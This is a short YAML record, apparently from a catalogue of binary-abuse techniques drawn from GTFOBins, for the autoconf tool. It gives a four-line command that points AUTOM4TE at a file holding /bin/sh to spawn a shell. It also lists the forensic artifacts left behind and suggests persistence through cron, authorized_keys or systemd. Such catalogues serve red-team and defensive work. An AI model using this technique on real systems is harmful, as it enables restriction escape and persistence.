---
name: autoconf
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo /bin/sh >/path/to/temp-file
    chmod +x /path/to/temp-file
    touch configure.ac
    AUTOM4TE=/path/to/temp-file autoconf
references:
- https://gtfobins.github.io/gtfobins/autoconf/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
